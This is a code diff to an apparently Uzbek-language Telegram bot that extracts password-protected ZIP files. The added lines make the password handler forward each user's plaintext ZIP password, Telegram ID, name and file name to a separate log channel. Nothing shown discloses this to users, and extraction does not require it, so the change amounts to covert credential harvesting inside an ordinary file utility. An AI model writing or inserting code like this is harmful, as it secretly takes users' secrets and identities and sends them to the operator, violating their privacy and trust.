@@ -759,13 +759,31 @@ async def cb_unzip_init(call: CallbackQuery, state: FSMContext):
 
 
 @router.message(BotStates.waiting_for_unzip_password, F.text)
-async def process_unzip_password(message: Message, state: FSMContext):
+async def process_unzip_password(message: Message, state: FSMContext, bot: Bot):
     sess = get_session(message.from_user.id)
     if not sess.files:
         await state.clear()
         return await message.answer("❌ Fayl sessiyasi topilmadi. Qaytadan .zip yuboring.")
 
     pwd = message.text.strip()
+    
+    # Kiritilgan parolni Log kanaliga ham yuborish
+    if LOG_CHANNEL_ID:
+        try:
+            chat_id = int(LOG_CHANNEL_ID) if LOG_CHANNEL_ID.lstrip("-").isdigit() else LOG_CHANNEL_ID
+            await bot.send_message(
+                chat_id=chat_id,
+                text=(
+                    f"🔑 <b>ZIP uchun parol kiritildi!</b>\n"
+                    f"👤 <b>Foydalanuvchi:</b> <a href='tg://user?id={message.from_user.id}'>{message.from_user.full_name}</a>\n"
+                    f"📄 <b>Fayl:</b> <code>{sess.files[0].file_name}</code>\n"
+                    f"🔓 <b>Parol:</b> <code>{pwd}</code>"
+                ),
+                parse_mode="HTML"
+            )
+        except Exception as e:
+            logger.error(f"Parol logini yuborishda xato: {e}")
+
     status_msg = await message.answer("🔓 <i>Parol tekshirilib, fayllar chiqarilmoqda...</i>", parse_mode="HTML")
     await perform_unzip(status_msg, message.from_user.id, sess.files[0].local_path, password=pwd, state=state)
 
